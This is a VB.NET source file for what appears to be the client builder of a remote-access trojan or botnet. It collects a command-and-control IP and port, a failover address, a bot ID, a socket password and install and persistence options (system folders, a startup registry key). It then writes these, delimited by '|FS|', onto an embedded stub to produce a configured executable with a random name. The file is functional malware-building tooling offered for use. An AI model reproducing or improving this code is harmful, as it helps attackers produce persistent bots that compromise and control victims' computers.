Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions

Public Class Builder

    Dim profiles() As String

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Me.ListBox1.SelectedItems.Count = 0 Then
            MessageBox.Show("Please select a host from the profile list, if is empty then add one!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        Else
            TextBox1.Text = ListBox1.SelectedItem.ToString.Substring(0, ListBox1.SelectedItem.ToString.LastIndexOf(":"))
            TextBox2.Text = ListBox1.SelectedItem.ToString.Substring(ListBox1.SelectedItem.ToString.LastIndexOf(":") + 1)

        End If

        If instshit.Checked = True Then
            If installsubdir.Text = "" Or installfnametxt.Text = "" Then
                MessageBox.Show("Sub Folder or File Name can't be empty! Fill Boths!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If
        End If
        If passbuild.Text = "" Then
            MessageBox.Show("You must enter a valid password for the socket connection!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If
        If TextBox6.Text = "" Then
            MessageBox.Show("You must enter a valid failover ip address, if you don't own one just enter the same first ip!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        Dim Ip As String = ""
        Dim Ip2 As String = ""
        Dim Port As String = ""
        Dim BotId As String = ""
        Dim Vers As String = ""
        Dim installFolder As String = ""
        Dim installPath As String = ""
        Dim installFname As String = ""
        Dim regkey As String = ""
        Dim sockpass As String = ""
        Dim notes As String = ""

        Dim ffname As String = ""
        Dim stub As String = ""
        Const FS1 As String = "|FS|"
        Dim Temp As String = Application.StartupPath + "/stub.exe"
        Dim SFD As New SaveFileDialog
        SFD.Title = "Save Server"

        Dim s As String = "ABCDEFGHIJKLMNOPRSTUVXYZWabcdefghijklmnopqrstuvxyzw1234567890"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 16 '16bit key
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        SFD.FileName = sb.ToString() & ".exe"

        If SFD.ShowDialog() = DialogResult.OK Then
            If SFD.FileName > "" Then
                Button1.Text = "Building ..."
                Button1.Enabled = False

                Ip = TextBox1.Text
                Ip2 = TextBox6.Text
                Ip2 = Regex.Replace(Ip2, "^\s+$[\r\n]*", "", RegexOptions.Multiline)
                Port = TextBox2.Text
                BotId = botidtxt.Text
                Vers = version.Text
                sockpass = passbuild.Text

                Dim notb = notesclient.Text
                notb = Regex.Replace(notb, "^\s+$[\r\n]*", "", RegexOptions.Multiline)

                If notb = "" Then
                    notes = "-"
                Else
                    notes = notb
                End If


                If instshit.Checked = True Then
                    If usrfold.Checked = True Then
                        installFolder = "User"
                    ElseIf prgfold.Checked = True Then
                        installFolder = "Program"
                    ElseIf sysfold.Checked = True Then
                        installFolder = "System"
                    End If

                    'StartUp
                    installPath = InstallLocationPre.Text
                    If CheckBox2.Checked = True Then
                        regkey = TextBox5.Text
                    End If

                End If

                Try
                    File.WriteAllBytes(Temp, My.Resources.Client)
                    FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                    stub = Space(LOF(1))
                    FileGet(1, stub)
                    FileClose(1)

                    If Path.HasExtension(SFD.FileName) = True Then
                        ffname = SFD.FileName
                    Else
                        ffname = SFD.FileName & ".exe"
                    End If

                    Dim instffname As String = ""
                    If Path.HasExtension(installfnametxt.Text) = True Then
                        instffname = installfnametxt.Text
                    Else
                        instffname = installfnametxt.Text & ".exe"
                    End If

                    FileOpen(1, ffname, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

                    FilePut(1, stub & FS1 & Ip & FS1 & Port & FS1 & BotId & FS1 & Vers & FS1 & installFolder & FS1 & installsubdir.Text & FS1 & instffname & FS1 & regkey & FS1 & startup.Checked & FS1 & sockpass & FS1 & Ip2 & FS1 & notes & FS1) 'Args

                    FileClose(1)
                    If File.Exists("stub.exe") Then
                        Try
                            File.Delete("stub.exe")
                        Catch ex As Exception
                        End Try
                    End If
                Catch ex As Exception
                    If File.Exists("stub.exe") Then
                        Try
                            File.Delete("stub.exe")
                        Catch e1x As Exception
                        End Try
                    End If
                End Try
                Button1.Text = "Build Client"
                Button1.Enabled = True
                MessageBox.Show(ffname, "DONE!", MessageBoxButtons.OK)
            End If
        End If



    End Sub

    Private Sub TextBox7_TextChanged(sender As Object, e As EventArgs) Handles installsubdir.TextChanged
        InstallLocationPre.Text = installsubdir.Text & "\" & installfnametxt.Text & ".exe"
    End Sub

    Private Sub TextBox8_TextChanged(sender As Object, e As EventArgs) Handles installfnametxt.TextChanged
        InstallLocationPre.Text = installsubdir.Text & "\" & installfnametxt.Text & ".exe"
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles instshit.CheckedChanged
        If instshit.Checked = True Then
            usrfold.Enabled = True
            prgfold.Enabled = True
            sysfold.Enabled = True

            installsubdir.Enabled = True
            installfnametxt.Enabled = True
            CheckBox2.Enabled = True
            startup.Enabled = True

        ElseIf instshit.Checked = False Then
            usrfold.Enabled = False
            prgfold.Enabled = False
            sysfold.Enabled = False
            TextBox6.Enabled = False
            installsubdir.Enabled = False
            installfnametxt.Enabled = False
            CheckBox2.Checked = False
            CheckBox2.Enabled = False
            startup.Enabled = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            TextBox5.Enabled = True
        Else
            TextBox5.Enabled = False
        End If
    End Sub


    Private Sub Builder_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Dim result As Integer = MessageBox.Show("Save builder configuration?", "Remember Configuration ?", MessageBoxButtons.YesNo, MessageBoxIcon.Information)
        If result = DialogResult.No Then

        ElseIf result = DialogResult.Yes Then
            Try
                If File.Exists(Application.StartupPath & "\Settings" & "\SettingsBuilder.ini") Then File.Delete(Application.StartupPath & "\Settings" & "\SettingsBuilder.ini")

                File.WriteAllText(Application.StartupPath & "\Settings" & "\SettingsBuilder.ini", String.Join("|", New String() {botidtxt.Text, version.Text, TextBox1.Text, TextBox2.Text, installsubdir.Text, installfnametxt.Text, InstallLocationPre.Text, TextBox5.Text}))
                Dim globString As String
                Using sw As StreamWriter = File.AppendText(Application.StartupPath & "\Settings" & "\SettingsBuilder.ini")

                    ' Saving Checkboxes States
                    If instshit.Checked = True Then
                        globString += ("|True")
                    Else
                        globString += ("|False")
                    End If

                    If usrfold.Checked = True Then
                        globString += ("|usrfold")
                    ElseIf prgfold.Checked = True Then
                        globString += ("|prgfold")
                    ElseIf sysfold.Checked = True Then
                        globString += ("|sysfold")
                    End If

                    If CheckBox2.Checked = True Then
                        globString += ("|True")
                    Else
                        globString += ("|False")
                    End If

                    If startup.Checked = True Then
                        globString += ("|True")
                    Else
                        globString += ("|False")
                    End If

                    globString += "|"
                    For Each profile In ListBox1.Items
                        globString += profile + "-"
                    Next


                    If CheckBox1.Checked = True Then
                        globString += ("|True")
                    Else
                        globString += ("|False")
                    End If

                    globString += "|"
                    globString += passbuild.Text


                    If notesclient.Text <> "" Then
                        globString += "|"
                        globString += notesclient.Text
                    Else
                        globString += "|"
                    End If

                    globString += "|"
                    globString += TextBox6.Text

                    globString += "|"
                    sw.WriteLine(globString)

                End Using

            Catch : End Try
        End If
        ListBox1.Items.Clear()
    End Sub

    Private Sub FlushToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FlushToolStripMenuItem.Click
        ListBox1.Items.Clear()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        ListBox1.Items.Insert(0, TextBox1.Text & ":" & TextBox2.Text)
    End Sub

    Private Sub DeleteProfileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteProfileToolStripMenuItem.Click
        ListBox1.Items.Remove(ListBox1.SelectedItem)

    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim values() As String = File.ReadAllText(Application.StartupPath & "\Settings" & "\SettingsBuilder.ini").Split("|"c)


            profiles = values(12).Split("-"c)
            For Each profile In profiles
                If profile <> "" Then
                    ListBox1.Items.Insert(0, profile)
                End If
            Next

            If values(0) <> "" Then
                botidtxt.Text = values(0)
            End If
            If values(1) <> "" Then
                version.Text = values(1)
            End If
            If values(2) <> "" Then
                TextBox1.Text = values(2)
            End If
            If values(3) <> "" Then
                TextBox2.Text = values(3)
            End If
            If values(4) <> "" Then
                installsubdir.Text = values(4)
            End If
            If values(5) <> "" Then
                installfnametxt.Text = values(5)
            End If
            If values(6) <> "" Then
                InstallLocationPre.Text = values(6)
            End If
            If values(7) <> "" Then
                TextBox5.Text = values(7)
            End If


            If values(8) = "True" Then
                instshit.Checked = True
            Else
                instshit.Checked = False
            End If

            If values(9) = "usrfold" Then
                usrfold.Checked = True
            ElseIf values(9) = "prgfold" Then
                prgfold.Checked = True
            ElseIf values(9) = "sysfold" Then
                sysfold.Checked = True
            End If

            If values(10) = "True" Then
                CheckBox2.Checked = True
            Else
                CheckBox2.Checked = False
            End If
            If values(11) = "True" Then
                startup.Checked = True
            Else
                startup.Checked = False
            End If

            If values(13) = "True" Then
                CheckBox1.Checked = True
            Else
                CheckBox1.Checked = False
            End If
            If values(14) <> "" Then
                passbuild.Text = values(14)
            End If

            If values(15) <> "" Then
                notesclient.Text = values(15)
            End If
            If values(16) <> "" Then
                TextBox6.Text = values(16)
            End If

        Catch : End Try

        If ListBox1.Items.Count > 0 Then
            ListBox1.SelectedIndex = 0
        End If
    End Sub

    Private Sub ListBox1_DoubleClick(sender As Object, e As EventArgs) Handles ListBox1.DoubleClick
        If Me.ListBox1.SelectedIndex >= 0 Then
            TextBox1.Text = ListBox1.SelectedItem.ToString.Substring(0, ListBox1.SelectedItem.ToString.LastIndexOf(":"))
            TextBox2.Text = ListBox1.SelectedItem.ToString.Substring(ListBox1.SelectedItem.ToString.LastIndexOf(":") + 1)

        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged_1(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            passbuild.UseSystemPasswordChar = False
        ElseIf CheckBox1.Checked = False Then
            passbuild.UseSystemPasswordChar = True
        End If
    End Sub


End Class